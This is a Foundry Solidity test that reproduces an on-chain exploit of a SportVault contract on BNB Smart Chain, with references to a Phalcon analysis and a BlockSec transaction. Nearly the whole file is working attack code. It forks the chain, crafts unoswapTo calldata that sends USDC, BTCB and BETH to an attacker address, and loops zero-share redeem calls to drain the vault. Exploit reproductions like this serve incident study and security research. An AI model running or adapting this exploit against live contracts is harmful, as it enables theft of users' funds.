// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1782966566042181957
// @TX
// https://app.blocksec.com/explorer/tx/bsc/0x49ca5e188c538b4f2efb45552f13309cc0dd1f3592eee54decfc9da54620c2ec

interface ISportVault{
    function redeem(
        uint256 sharesToRedeem,
        address receivingAsset,
        uint256 minTokensToReceive,
        bytes[] calldata dataList,
        bool useDiscount
    )
    external
    returns (uint256 tokensToReturn);
}


contract ContractTest is Test {
    IERC20 USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 BETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ISportVault sportVault = ISportVault(0x4eDda16AB4f4cc46b160aBC42763BA63885862a4);

    address Attacker = address(0x1111111111111111111111111111111111111111);
    
    function setUp() public {
        vm.createSelectFork("bsc", 38_126_753);
    }

    function testExploit() public {
        bytes[] memory dataList = new bytes[](11); //@note mock data list - unoswapTo
        uint256[] memory pools = new uint256[](1);
        pools[0] = uint256(28948022309329048857350594136651893637891169795467361725136627244723734772827);
        dataList[0] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,
            address(USDC),
            2331516232778274153239,
            0,
            pools
        );

        pools[0] = uint256(28948022309329048857350594135968575911172281388296638049447197314275709206658);
        dataList[1] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,
            address(BTCB),
            16071737934381556,
            0,
            pools
        );

        pools[0] = uint256(28948022309329048857350594136076890004755093450729657598371073172666212569020);
        dataList[2] = abi.encodeWithSignature(
            "unoswapTo(address,address,uint256,uint256,uint256[])",
            Attacker,
            address(BETH),
            256895663903293078,
            0,
            pools
        );
          
        dataList[3] = new bytes(0);
        dataList[4] = new bytes(0);
        dataList[5] = new bytes(0);
        dataList[6] = new bytes(0);
        dataList[7] = new bytes(0);
        dataList[8] = new bytes(0);
        dataList[9] = new bytes(0);
        dataList[10] = new bytes(0);

        console2.log("Attacker BNB balance before: ", Attacker.balance);

        for(uint i = 0; i < 20; i++){
            USDC.balanceOf(address(sportVault));
            BTCB.balanceOf(address(sportVault));
            BETH.balanceOf(address(sportVault));
            BUSD.balanceOf(address(sportVault));

            sportVault.redeem(
                0,
                address(BUSD),
                0,
                dataList, 
                false
            );
        }

        console2.log("Attacker BNB balance after: ", Attacker.balance);
    }

}
